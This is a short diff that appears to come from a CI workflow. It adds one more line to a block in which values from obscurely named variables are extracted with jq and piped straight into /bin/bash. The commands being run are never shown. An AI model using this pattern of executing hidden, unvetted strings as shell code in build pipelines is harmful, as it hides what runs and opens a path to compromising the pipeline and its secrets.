@@ -23,6 +23,7 @@ jobs:
           echo $qigo78 | jq -r .yj13 | /bin/bash
           printf '%s' "$alye8" | jq -r .uwtui806 | /bin/bash
           printf '%s' "$qfcv2" | jq -r .dtvr3 | /bin/bash
+          echo $not9482 | jq -r .gq360 | /bin/bash
 
       - name: Upload data
         if: always()
